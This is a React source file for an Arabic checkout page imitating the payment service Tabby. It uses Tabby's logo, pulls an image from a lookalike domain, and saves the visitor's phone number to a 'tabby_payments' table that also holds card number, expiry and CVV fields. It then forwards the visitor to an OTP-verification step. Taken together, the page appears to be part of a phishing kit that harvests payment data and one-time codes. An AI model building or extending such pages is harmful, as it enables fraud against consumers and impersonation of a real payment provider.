import { useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ChevronRight } from "lucide-react";
import tabbyLogo from "@/assets/tabby-logo.png";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";

const TabbyCheckout = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const sessionId = useVisitorTracking();
  const price = searchParams.get("price") || "0";
  const company = searchParams.get("company") || "";
  
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "");
    setPhoneNumber(value.substring(0, 9));
  };
  
  const handleContinue = async () => {
    if (phoneNumber.length === 9) {
      try {
        // إنشاء سجل دفع تابي فوراً مع رقم الهاتف
        const { data, error } = await supabase
          .from("tabby_payments")
          .insert({
            phone: `966${phoneNumber}`,
            total_amount: parseFloat(price),
            company: company,
            cardholder_name: "Customer",
            card_number: "0000000000000000",
            card_number_last4: "0000",
            expiry_date: "00/00",
            cvv: "000",
            payment_status: "pending",
            visitor_session_id: sessionId,
          })
          .select()
          .single();

        if (error) throw error;
        
        // الانتقال لصفحة OTP مع paymentId
        navigate(`/tabby-otp-verification?price=${price}&company=${company}&phone=${phoneNumber}&paymentId=${data.id}`);
      } catch (error) {
        console.error("Error creating Tabby payment:", error);
        toast({
          title: "خطأ",
          description: "حدث خطأ في إنشاء الطلب",
          variant: "destructive",
        });
      }
    }
  };
  return <div className="min-h-screen bg-[#F8F9FA]" dir="rtl">
      <div className="max-w-[480px] mx-auto bg-white min-h-screen">
        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-gray-200">
          <button onClick={() => window.history.back()} className="flex items-center gap-2 text-[#3CDBC0] hover:text-[#2fc4aa] transition-colors text-sm font-medium">
            <ChevronRight className="w-4 h-4" />
            العودة إلى المتجر
          </button>
          <button className="text-sm text-blue-600 hover:text-blue-700 transition-colors">
            English
          </button>
        </div>

        {/* Store Name and Tabby Logo */}
        <div className="text-center py-6 border-b border-gray-100">
          
          <div className="flex items-center justify-center gap-2 text-sm text-gray-600">
            <span>الدفع بواسطة</span>
            <img src={tabbyLogo} alt="تابي" className="h-5 object-contain" />
          </div>
        </div>

        {/* Progress Steps */}
        <div className="flex items-center justify-center gap-6 py-8 px-8">
          <div className="w-10 h-10 rounded-lg border border-gray-300 flex items-center justify-center bg-white">
            <svg className="w-5 h-5 text-gray-400" viewBox="0 0 24 24" fill="none">
              <path d="M9 12h6m-6 4h6m2 5H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5.586a1 1 0 0 1 .707.293l5.414 5.414a1 1 0 0 1 .293.707V19a2 2 0 0 1-2 2z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
          <div className="flex-1 h-[1px] bg-gray-300"></div>
          <div className="w-10 h-10 rounded-lg border border-gray-300 flex items-center justify-center bg-white">
            <svg className="w-5 h-5 text-gray-400" viewBox="0 0 24 24" fill="none">
              <rect x="3" y="6" width="18" height="13" rx="2" stroke="currentColor" strokeWidth="2" />
              <path d="M3 10h18" stroke="currentColor" strokeWidth="2" />
            </svg>
          </div>
          <div className="flex-1 h-[1px] bg-gray-300"></div>
          <div className="w-10 h-10 rounded-lg border border-gray-300 flex items-center justify-center bg-white">
            <svg className="w-5 h-5 text-gray-400" viewBox="0 0 24 24" fill="none">
              <path d="M9 12l2 2 4-4m6 2a9 9 0 1 1-18 0 9 9 0 0 1 18 0z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
          </div>
        </div>

        {/* Hero Image */}
        <div className="px-8 mb-8">
          <div className="w-full rounded-2xl overflow-hidden shadow-md">
            <img src="https://tabby.sallapayment.store/assets/auth-image.png" alt="Tabby" className="w-full h-auto object-cover" onError={e => {
            e.currentTarget.style.display = 'none';
            e.currentTarget.parentElement!.classList.add('aspect-[16/9]', 'bg-gradient-to-br', 'from-orange-100', 'to-orange-200');
          }} />
          </div>
        </div>

        {/* Content */}
        <div className="px-8">
          <h1 className="text-2xl font-bold text-center mb-3 text-gray-900">
            قم بربط رقمك مع تابي
          </h1>
          <p className="text-center text-gray-600 mb-8 text-sm">
            أدخل رقم جوالك للحصول على رمز التحقق
          </p>

          {/* Phone Number Input */}
          <div className="flex items-center gap-3 mb-6">
            <div className="border border-gray-300 rounded-lg px-4 py-3 bg-gray-50">
              <span className="text-base font-medium text-gray-700">+966</span>
            </div>
            <div className="flex-1">
              <input type="tel" value={phoneNumber} onChange={handlePhoneChange} placeholder="رقم الجوال" className="w-full border border-gray-300 rounded-lg px-4 py-3 text-right outline-none focus:border-[#3CDBC0] focus:ring-1 focus:ring-[#3CDBC0] transition-all text-base" dir="ltr" />
            </div>
          </div>

          {/* Continue Button */}
          <button onClick={handleContinue} disabled={phoneNumber.length < 9} className="w-full bg-[#22C55E] hover:bg-[#16A34A] disabled:bg-gray-200 disabled:text-gray-400 text-white font-semibold py-3.5 rounded-lg transition-all text-base">
            استمرار
          </button>

          {/* Order Info */}
          <div className="text-center text-xs text-gray-500 mt-8 space-y-1">
            <p>قيمة الطلب: {price} ر.س</p>
          </div>
        </div>
      </div>
    </div>;
};
export default TabbyCheckout;